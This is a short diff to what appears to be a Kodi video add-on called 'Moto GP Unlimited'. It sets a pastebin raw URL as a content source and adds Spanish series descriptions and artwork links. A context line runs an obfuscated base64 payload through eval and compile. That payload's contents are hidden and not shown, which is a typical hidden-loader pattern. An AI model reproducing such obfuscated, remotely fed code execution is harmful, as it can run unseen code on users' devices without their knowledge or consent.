@@ -19,7 +19,7 @@ from kodi_six import xbmc,xbmcgui,xbmcaddon,xbmcvfs
 from six.moves import urllib_request
 import six
 TRANSLATEPATH = xbmc.translatePath if six.PY2 else xbmcvfs.translatePath
-url = 'https://pastebin.com/raw/'
+url = 'https://pastebin.com/raw/wiMV8aHt'
 titulo = 'Moto GP Unlimited'
 import base64, codecs
 
@@ -93,9 +93,9 @@ eval(compile(base64.b64decode(eval('\x6e\x65\x6f')),'<string>','exec'))
 ]]></expres>
 <page></page>
 </regex>
-<info></info>
-<thumbnail></thumbnail>
-<fanart>https://i.imgur.com/yNfc6m7.jpg</fanart>
+<info>La serie de ocho episodios, filmada por The Mediapro Studio durante la temporada 2021 de MotoGP™, siguió a los pilotos dentro y fuera de la pista.  Presenta a las estrellas durante algunos momentos espectaculares, así como algunos de los momentos más difíciles a los que se enfrenta un piloto de MotoGP™ cuando dedica su vida a un deporte tan exigente.</info>
+<thumbnail>https://www.themoviedb.org/t/p/original/r6EYUEOBHu2haKq5q6KE1bsXgIU.jpg</thumbnail>
+<fanart>https://www.themoviedb.org/t/p/original/iradn0z9ojGoPtalNN4p807IvCQ.jpg</fanart>
 </item>
 
 
